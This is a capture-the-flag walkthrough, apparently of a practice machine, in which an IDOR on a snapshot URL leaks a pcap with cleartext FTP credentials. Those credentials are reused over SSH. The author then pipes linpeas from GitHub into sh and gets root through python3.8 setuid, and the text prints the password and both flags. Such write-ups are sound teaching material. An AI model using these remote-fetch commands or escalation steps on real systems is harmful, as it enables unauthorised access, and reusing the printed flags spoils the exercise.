# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 21 | ftp |
| 22 | ssh |
| 80 | http |

We have three open ports, let's begin with reconnaissance.

# RECONNAISSANCE
---
![Pasted image 20250107160531.png](../../IMAGES/Pasted%20image%2020250107160531.png)

This is the standard page, we have `Dashboard`, `Security Snapshot` `Ip Config` `Network Status`, let's check each of those:

![Pasted image 20250107160748.png](../../IMAGES/Pasted%20image%2020250107160748.png)

Security snapshot takes us to another URL, if we click download, we are able to get a `7.pcap` file, if we use wireshark to analyze that, it's empty, so, let's keep searching in order to find anything useful:

![Pasted image 20250107161541.png](../../IMAGES/Pasted%20image%2020250107161541.png)

We have an Ip section, nothing rare, let's keep searching:

![Pasted image 20250107161617.png](../../IMAGES/Pasted%20image%2020250107161617.png)

Also a netstat section, nothing seems off too, 

```ad-hint

That's when I realized that when we enter the security snapshot section, we get redirected to a `/data/number` URL, so, I thought that if an IDOR vulnerability is there on the website, we may be able to read another scans, I used burp and it was indeed true, that's when I got that scan `5` had the following:



Now we have packets to read! Let's download the file and analyze it with wireshark:


```


# EXPLOITATION
---


Nothing useful came from this. That's when I kept searching and found the `/data/0` file, let's analyze it:

![Pasted image 20250107163040.png](../../IMAGES/Pasted%20image%2020250107163040.png)

We found something useful!

A ftp string, let's follow it:

![Pasted image 20250107163123.png](../../IMAGES/Pasted%20image%2020250107163123.png)

Nice, we got some credentials, let's log into `nathan` user:

```ad-note
`nathan`: `Buck3tH4TF0RM3!`
```

![Pasted image 20250107163428.png](../../IMAGES/Pasted%20image%2020250107163428.png)

We got access, we can see a `user.txt` flag, let's get it and read it:

![Pasted image 20250107163514.png](../../IMAGES/Pasted%20image%2020250107163514.png)

User flag is `f763e899654614af8d5f2e6a886516a0`

I thought than since that password works for ftp, some users tend to have the same password in different services, so, let's try to log into ssh with those credentials:

![Pasted image 20250107163700.png](../../IMAGES/Pasted%20image%2020250107163700.png)

I was right, let's proceed with privilege escalation.

# PRIVILEGE ESCALATION
---

We can not use sudo on this machine with nathan user:

![Pasted image 20250107163815.png](../../IMAGES/Pasted%20image%2020250107163815.png)


Let's use linpeas in this machine and check what it got for us:

![Pasted image 20250107164042.png](../../IMAGES/Pasted%20image%2020250107164042.png)

We can use curl in the machine, so, we can perform: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`

![Pasted image 20250107164142.png](../../IMAGES/Pasted%20image%2020250107164142.png)

Nice, when linpeas finishes, we can see the following:

![Pasted image 20250107164513.png](../../IMAGES/Pasted%20image%2020250107164513.png)

This is the binary we'll use in order to perform PE, I asked chatgpt and it said we must do the following steps:

```ad-summary
1. `/usr/bin/python3.8`
2. `import os`
3. `os.setuid(0)` (As this is root ID)
4. `os.system("bash")`

#### PoC
----

We can also see this procedure in Gtfobins:


```

Just like that, CTF is done, let's read root flag and submit it:

![Pasted image 20250107165111.png](../../IMAGES/Pasted%20image%2020250107165111.png)

Root: `bb58eed72cb4312008e7262c59c17d7b`

Gg!

